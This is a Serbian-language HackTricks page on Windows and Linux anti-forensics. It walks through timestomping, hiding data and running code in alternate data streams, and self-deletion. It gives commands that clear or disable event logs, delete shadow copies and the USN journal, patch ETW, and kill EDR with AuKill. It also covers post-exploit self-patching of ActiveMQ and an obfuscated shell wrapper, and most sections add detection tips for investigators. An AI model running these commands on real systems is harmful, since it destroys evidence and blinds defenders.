# Anti-forenzičke tehnike

{{#include ../../banners/hacktricks-training.md}}

## Vremenske oznake

Napadač može želeti da **promeni vremenske oznake datoteka** kako bi izbegao otkrivanje.\
Vremenske oznake mogu se pronaći u MFT-u, u atributima `$STANDARD_INFORMATION` \_\_ i \_\_ `$FILE_NAME`.

Oba atributa imaju 4 vremenske oznake: **izmena**, **pristup**, **kreiranje** i **izmena MFT zapisa** (MACE ili MACB).

**Windows Explorer** i drugi alati prikazuju informacije iz atributa **`$STANDARD_INFORMATION`**.

### TimeStomp - alatka za anti-forenziku

Ova alatka **menja** informacije o vremenskim oznakama unutar **`$STANDARD_INFORMATION`**, **ali ne** i informacije unutar **`$FILE_NAME`**. Zato je moguće **identifikovati** **sumnjivu** **aktivnost**.

### Usnjrnl

**USN Journal** (dnevnik Update Sequence Number) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. Alatka [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) omogućava pregled ovih promena.

![TimeStomp - alatka za anti-forenziku - Usnjrnl: USN Journal (dnevnik Update Sequence Number) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. ...](<../../images/image (801).png>)

Prethodna slika prikazuje **izlaz** alatke, u kom se vidi da su **izvršene neke promene** u datoteci.

### $LogFile

**Sve promene metapodataka u sistemu datoteka beleže se** postupkom poznatim kao [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zabeleženi metapodaci čuvaju se u datoteci pod nazivom `**$LogFile**`, koja se nalazi u korenskom direktorijumu NTFS sistema datoteka. Alatke kao što je [LogFileParser](https://github.com/jschicht/LogFileParser) mogu da se koriste za raščlanjivanje ove datoteke i prepoznavanje promena.

![Usnjrnl - $LogFile: Sve promene metapodataka u sistemu datoteka beleže se postupkom poznatim kao write-ahead logging. Zabeleženi metapodaci čuvaju se u datoteci pod nazivom $LogFile , koja se nalazi u korenskom...](<../../images/image (137).png>)

I ovde se u izlazu alatke vidi da su **izvršene neke promene**.

Istom alatkom moguće je utvrditi **na koje vreme su vremenske oznake promenjene**:

![Usnjrnl - $LogFile: Istom alatkom moguće je utvrditi na koje vreme su vremenske oznake promenjene](<../../images/image (1089).png>)

- CTIME: Vreme kreiranja datoteke
- ATIME: Vreme izmene datoteke
- MTIME: Vreme izmene MFT zapisa datoteke
- RTIME: Vreme pristupa datoteci

### Poređenje atributa `$STANDARD_INFORMATION` i `$FILE_NAME`

Drugi način za prepoznavanje sumnjivo izmenjenih datoteka jeste poređenje vremena u oba atributa i traženje **nepodudarnosti**.

### Nanosekunde

Vremenske oznake **NTFS-a** imaju **preciznost** od **100 nanosekundi**. Zato su datoteke sa vremenskim oznakama poput 2010-10-10 10:10:**00.000:0000 veoma sumnjive**.

### SetMace - alatka za anti-forenziku

Ova alatka može da izmeni oba atributa `$STARNDAR_INFORMATION` i `$FILE_NAME`. Međutim, od Windows Viste pa nadalje, za izmenu ovih informacija potreban je aktivni OS.

## Skrivanje podataka

NFTS koristi klastere i minimalnu veličinu informacija. To znači da ako datoteka zauzima jedan i po klaster, **preostala polovina se nikada neće koristiti** dok se datoteka ne obriše. Zato je moguće **sakriti podatke u tom neiskorišćenom prostoru**.

Postoje alatke kao što je slacker koje omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analizom datoteka `$logfile` i `$usnjrnl` može se otkriti da su dodati neki podaci:

![SetMace - alatka za anti-forenziku - Skrivanje podataka: Postoje alatke kao što je slacker koje omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analizom datoteka $logfile i $usnjrnl može se otkriti da su...](<../../images/image (1060).png>)

Zatim je moguće izdvojiti neiskorišćeni prostor alatkama kao što je FTK Imager. Imajte na umu da ovakva alatka može da sačuva sadržaj u prikrivenom ili čak šifrovanom obliku.

## UsbKill

Ova alatka **isključuje računar ako otkrije bilo kakvu promenu na USB** portovima.\
Jedan od načina da se otkrije jeste pregled aktivnih procesa i **provera svake pokrenute Python skripte**.

## Live Linux distribucije

Ove distribucije se **izvršavaju u RAM** memoriji. Jedini način da se otkriju jeste **ako je NTFS sistem datoteka montiran sa dozvolama za upis**. Ako je montiran samo sa dozvolama za čitanje, upad neće moći da se otkrije.

## Bezbedno brisanje

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Odloženo samobrisanje u Windowsu

Pokrenuta Windows slika može biti zaključana dok je njen proces aktivan. Proces može da prepusti brisanje podređenom `cmd.exe` procesu, da koristi `choice` kao tajmer i da se zatim završi pre nego što ljuska stigne do komande `del`. Odlaganje omogućava prvobitnom procesu da oslobodi ručku za svoju sliku; ako putanja sadrži razmake, mora se navesti pod navodnicima.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Kada se ovaj string prosleđuje direktno kao argument komandi `cmd.exe`, a ne unosi iz drugog interaktivnog prompta `cmd`, koristite `&` umesto `^&` i `>nul` umesto `^>nul`. Time se uklanja unos direktorijuma; ovo **nije bezbedno brisanje** i ne uklanja tragove izvršavanja, zadataka, dnevnika sistema datoteka niti druge forenzičke tragove. Potražite kratkotrajne procese-podređene procese `cmd.exe` čija komandna linija sadrži `choice /T`, `Del` i putanju do slike nadređenog procesa.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Konfiguracija Windowsa

Moguće je onemogućiti nekoliko Windows metoda evidentiranja da bi se forenzička istraga znatno otežala.

### Onemogućavanje vremenskih oznaka - UserAssist

Ovaj ključ registratora beleži datume i vreme kada je korisnik pokrenuo svaku izvršnu datoteku.

Za onemogućavanje UserAssist-a potrebna su dva koraka:

1. Postavite oba ključa registratora, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` i `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, na nulu da biste označili da želimo da onemogućimo UserAssist.
2. Očistite podstabla registratora koja izgledaju ovako: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Onemogućavanje vremenskih oznaka - Prefetch

Ovim se čuvaju informacije o pokrenutim aplikacijama radi poboljšanja performansi Windows sistema. Međutim, te informacije mogu biti korisne i u forenzičkoj praksi.

- Pokrenite `regedit`
- Izaberite putanju datoteke `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknite desnim tasterom miša na `EnablePrefetcher` i `EnableSuperfetch`
- Izaberite Modify za svaku od ovih stavki da biste promenili vrednost sa 1 (ili 3) na 0
- Ponovo pokrenite sistem

### Onemogućavanje vremenskih oznaka - vreme poslednjeg pristupa

Kad god se fascikla otvori sa NTFS volumena na Windows NT serveru, sistem ažurira **polje vremenske oznake u svakoj fascikli na listi**, koje se naziva vreme poslednjeg pristupa. Na intenzivno korišćenom NTFS volumenu to može uticati na performanse.

1. Otvorite Registry Editor (Regedit.exe).
2. Idite do `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Potražite `NtfsDisableLastAccessUpdate`. Ako ne postoji, dodajte ovaj DWORD i postavite mu vrednost na 1 da biste onemogućili taj proces.
4. Zatvorite Registry Editor i ponovo pokrenite server.

### Brisanje istorije USB uređaja

Svi **unosi USB uređaja** čuvaju se u Windows registratoru, pod ključem registratora **USBSTOR**, koji sadrži potključeve kreirane svaki put kada priključite USB uređaj na računar ili laptop. Ovaj ključ možete pronaći ovde: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Brisanjem ovog ključa** briše se istorija USB uređaja.\
Možete koristiti i alat [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) da biste proverili da li su izbrisani (i da biste ih izbrisali).

Još jedna datoteka koja čuva informacije o USB uređajima jeste `setupapi.dev.log` u fascikli `C:\Windows\INF`. I nju treba izbrisati.

### Onemogućavanje Shadow Copies

**Izlistajte** shadow copies komandom `vssadmin list shadowstorage`\
**Izbrišite** ih komandom `vssadmin delete shadow`

Možete ih izbrisati i preko grafičkog interfejsa prateći korake opisane na [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Da biste onemogućili shadow copies [pratite ove korake](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otvorite program Services tako što ćete nakon klika na dugme za pokretanje Windowsa u polje za tekst pretrage upisati „services“.
2. Na listi pronađite „Volume Shadow Copy“, izaberite ga, a zatim desnim klikom miša otvorite Properties.
3. U padajućem meniju „Startup type“ izaberite Disabled, a zatim potvrdite promenu klikom na Apply i OK.

Takođe je moguće promeniti konfiguraciju datoteka koje će se kopirati u shadow copy u registratoru `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Prepisivanje izbrisanih datoteka

- Možete koristiti **Windows alatku**: `cipher /w:C`. Time ćete zadati cipher-u da ukloni sve podatke iz slobodnog, nekorišćenog prostora na disku C.
- Možete koristiti i alatke kao što je [**Eraser**](https://eraser.heidi.ie)

### Brisanje Windows dnevnika događaja

- Windows + R --> eventvwr.msc --> Proširite „Windows Logs“ --> Kliknite desnim tasterom miša na svaku kategoriju i izaberite „Clear Log“
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Onemogućavanje Windows dnevnika događaja

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- U odeljku services onemogućite uslugu „Windows Event Log“
- `WEvtUtil.exec clear-log` ili `WEvtUtil.exe cl`

### Onemogućavanje $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Napredno evidentiranje i neovlašćeno menjanje tragova (2023-2025)

### PowerShell ScriptBlock/Module Logging

Novije verzije Windows 10/11 i Windows Server sistema čuvaju **opsežne PowerShell forenzičke artefakte** u okviru
`Microsoft-Windows-PowerShell/Operational` (događaji 4104/4105/4106).  
Napadači mogu da ih onemoguće ili obrišu u hodu:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Branioci treba da nadgledaju promene tih ključeva registratora i masovno uklanjanje PowerShell događaja.

### ETW (Event Tracing for Windows) Patch

Proizvodi za bezbednost krajnjih tačaka u velikoj meri se oslanjaju na ETW. Popularna metoda izbegavanja iz 2024. jeste da se u memoriji zakrpe `ntdll!EtwEventWrite`/`EtwEventWriteFull`, tako da svaki ETW poziv vrati `STATUS_SUCCESS` bez emitovanja događaja:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Javni PoC-ovi (npr. `EtwTiSwallow`) implementiraju isti primitiv u PowerShell-u ili C++-u.  
Pošto je zakrpa **lokalna za proces**, EDR-ovi koji rade unutar drugih procesa možda je neće detektovati.<sup>[[5]](#references)</sup>
Detekcija: uporedite `ntdll` u memoriji sa verzijom na disku ili postavite hook pre user-mode-a.

### Oživljavanje Alternate Data Streams (ADS)

Primećeno je da malware kampanje iz 2023. godine (npr. **FIN12** loader-i) smeštaju binarne datoteke druge faze unutar ADS-a kako bi ih sakrili od tradicionalnih skenera:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Nabrojte stream-ove pomoću `dir /R`, `Get-Item -Stream *` ili Sysinternals `streams64.exe`.
Kopiranje host datoteke na FAT/exFAT ili putem SMB-a ukloniće skriveni stream i može omogućiti
istražiteljima da oporave payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver se sada rutinski koristi za **anti-forensics** tokom ransomware upada.  
Open-source alat **AuKill** učitava potpisani, ali ranjivi driver (`procexp152.sys`) da bi
suspendovao ili prekinuo rad EDR-a i forenzičkih senzora **pre enkripcije i uništavanja logova**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Drajver se nakon toga uklanja, ostavljajući minimalno tragova.<sup>[[1]](#references)</sup>  
Mere ublažavanja: omogućite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/SAC)
i podesite upozorenja za kreiranje kernel servisa iz putanja u koje korisnik može da upisuje.

---

## Linux Anti-Forensics: Samostalno zakrpljivanje servisa u cilju smanjenja detekcije (2023–2025)

### Samostalno zakrpljivanje kompromitovanih servisa u cilju smanjenja detekcije (Linux)
Napadači sve češće „samostalno zakrpe” servis odmah nakon njegovog iskorišćavanja, kako bi sprečili ponovno iskorišćavanje i suzbili detekciju zasnovanu na ranjivostima. Ideja je da ranjive komponente zamene najnovijim legitimnim upstream binarnim datotekama/JAR-ovima, tako da skeneri prijave da je host zakrpljen, dok persistence i C2 ostaju aktivni.<sup>[[3]](#references)</sup>

Primer: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Nakon eksploatacije, napadači su preuzimali legitimne JAR-ove sa Maven Central-a (repo1.maven.org), brisali ranjive JAR-ove iz instalacije ActiveMQ-a i ponovo pokretali broker.
- Time je zatvoren početni RCE, dok su drugi načini pristupa ostali dostupni (cron, izmene SSH konfiguracije, zasebni C2 implanti).

Operativni primer (ilustrativno)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Forenzički saveti za hunting
- Pregledajte direktorijume servisa u potrazi za nezakazanim zamenama binarnih datoteka/JAR-ova:
  - Debian/Ubuntu: `dpkg -V activemq` i uporedite hash-eve/datoteke sa repo mirror-ima.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Potražite JAR verzije koje postoje na disku, ali nisu u vlasništvu upravljača paketima, kao i simboličke linkove ažurirane out-of-band.
- Vremenska linija: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` da biste povezali ctime/mtime sa periodom kompromitovanja.
- Shell istorija/telemetrija procesa: tragovi komandi `curl`/`wget` ka `repo1.maven.org` ili drugim CDN-ovima za artefakte neposredno nakon početne eksploatacije.
- Upravljanje izmenama: proverite ko je primenio „zakrpu“ i zašto, a ne samo da li je prisutna zakrpljena verzija.

### C2 preko cloud usluga sa bearer tokenima i anti-analysis stagerima
Uočene taktike kombinovale su više dugotrajnih C2 kanala i anti-analysis pakovanje:<sup>[[3]](#references)</sup>
- PyInstaller ELF loader-i zaštićeni lozinkom, radi otežavanja sandboxing-a i statičke analize (npr. šifrovani PYZ, privremena ekstrakcija u `/_MEI*`).
  - Indikatori: rezultati komande `strings`, kao što su `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Artefakti tokom izvršavanja: ekstrakcija u `/tmp/_MEI*` ili prilagođene putanje `--runtime-tmpdir`.
- C2 preko Dropbox-a sa hardkodovanim OAuth Bearer tokenima
  - Mrežni markeri: `api.dropboxapi.com` / `content.dropboxapi.com` sa `Authorization: Bearer <token>`.
  - Potražite odlazni HTTPS sa servera ka Dropbox domenima koji obično ne sinhronizuju fajlove, koristeći proxy/NetFlow/Zeek/Suricata.
- Paralelni/rezervni C2 preko tunelovanja (npr. Cloudflare Tunnel `cloudflared`), da bi se zadržala kontrola ako se jedan kanal blokira.
  - Host IOCs: procesi/jedinice `cloudflared`, konfiguracija u `~/.cloudflared/*.json`, odlazne veze na portu 443 ka Cloudflare ivicama.

### Održavanje pristupa kroz persistence i „hardening rollback“ (primeri za Linux)
Napadači često kombinuju samostalno zakrpavanje sa trajnim putevima za pristup:<sup>[[3]](#references)</sup>
- Cron/Anacron: izmene `0anacron` stub-a u svakom direktorijumu `/etc/cron.*/` radi periodičnog izvršavanja.
  - Potražite:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Poništavanje hardening-a SSH konfiguracije: omogućavanje root prijavljivanja i menjanje podrazumevanih shell-ova za naloge sa niskim privilegijama.
  - Potražite omogućavanje root prijavljivanja:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Potražite sumnjive interaktivne shell-ove na sistemskim nalozima (npr., `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Nasumični beacon artefakti kratkih naziva (8 abecednih znakova), zapisani na disk, koji takođe komuniciraju sa cloud C2:
  - Potraži:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Branioci treba da povežu ove artefakte sa izloženošću spolja i događajima instaliranja zakrpa na servisima kako bi otkrili anti-forenzičko samosaniranje kojim se prikriva početna eksploatacija.

## Izvršavanje statičkog shell-a sa ugrađenim interpreterom

Omotač skripte sa ugrađenim interpreterom i implementacijama komandi može da izvršava podržane shell operacije unutar jednog izvršnog fajla, umesto da pokreće `/bin/sh` i zasebne procese pomoćnih programa. HimitsuShell pravi takav statički musl binarni fajl. Za razliku od [SHc wrappers](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md), njegove ugrađene komande ne moraju da pokreću host shell niti zaseban proces pomoćnog programa. Nepodržane komande mogu da se proslede sistemskom shell-u.<sup>[[9]](#references)</sup>

Time se smanjuje vidljivost shell procesa i podređenih poziva `execve`.<sup>[[9]](#references)</sup> Proces omotača i njegovi sistemski pozivi i dalje su vidljivi putem kernel tracepoints, pa tvrdnju projekta da je nevidljiv čak i kernel praćenju ne treba shvatiti doslovno.<sup>[[9]](#references)[[11]](#references)</sup>

Za dokumentovanu x86_64 verziju, ostavite ulaznu datoteku pod imenom `launcher.sh` i kopirajte je u kontejner pre kompajliranja. Izlazna datoteka je `safeLauncher`:<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

Javni `compile.sh` šifruje skriptu pomoću AES-256-CTR, šifruje vrednost isteka i međuključeve/IV-ove pomoću AES-256-CBC, pretvara šifrovane fajlove u C nizove pomoću `xxd -i` i povezuje ih sa `lib.bc` koristeći `-static -s`. Konačni ključ za šifrovanje i IV su takođe ugrađeni, pa ovo predstavlja zaštitu od usputnog statičkog izdvajanja, a ne tajnu koja se nikada ne može otkriti.<sup>[[10]](#references)</sup>

Podrazumevani LLVM prolazi su `-sobf` i `-sub`. Pre izgradnje izmenite `/var/work/compile.sh` da biste omogućili dokumentovane alternative, kao što su izravnavanje kontrolnog toka (`fla`) ili lažni kontrolni tok (`bcf`).<sup>[[9]](#references)[[10]](#references)</sup>

Pre nego što se oslonite na ovaj omotač, proverite kompatibilnost skripti: projekat cilja POSIX sintaksu ljuske, upozorava da Bash/Zsh skripte možda neće raditi i navodi da se komande van ugrađenog skupa izvršavaju pomoću sistemske ljuske.<sup>[[9]](#references)</sup>

Za analizu izravnatog kontrolnog toka pogledajte [zaobilaženje izravnatog kontrolnog toka pomoću uskog segmenta izvršavanja](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill: naoružani ranjivi drajver za onemogućavanje EDR-a (mart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Izmena EtwEventWrite za skrivenost: detekcija i potraga (jun 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Izmene radi postojanosti: kako se Linux malver DripDropper kreće kroz cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE u Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Sakrivanje vašeg .NET-a – ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Otkrivanje varijante SectopRAT-a ugrađene u legitiman softver](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – komanda choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – komanda del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [HimitsuShell README](https://github.com/HimitsuShell/HimitsuShell)
- [10] [HimitsuShell skripta za izgradnju](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Histogrami događaja Linux kernela i praćenje sistemskih poziva](https://docs.kernel.org/trace/histogram.html)
